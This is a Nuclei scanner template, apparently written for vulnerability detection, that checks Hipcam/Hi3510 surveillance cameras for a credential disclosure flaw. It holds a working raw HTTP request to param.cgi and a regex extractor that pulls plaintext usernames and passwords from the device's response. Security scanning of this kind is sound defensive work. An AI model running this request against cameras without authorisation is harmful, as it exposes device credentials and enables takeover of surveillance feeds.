id: hipcam-user-credential-disclosure
info:
  name: Hipcam User Credential Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The plaintext password of the surveillance camera based on Huawei Hi3510 chip is leaked, allowing attackers to view all usernames and passwords of the device, gain full control, and view monitoring content through a simple HTTP request.
  reference:
    - https://www.secpulse.com/archives/45468.html
  tags:
    - disclosure
    - sensitive-information

http:
  - raw:
      - |
        GET /web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "username0="
          - "password0="
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        part: body
        regex:
          - "username0=(.*?)&password0=(.*?)"
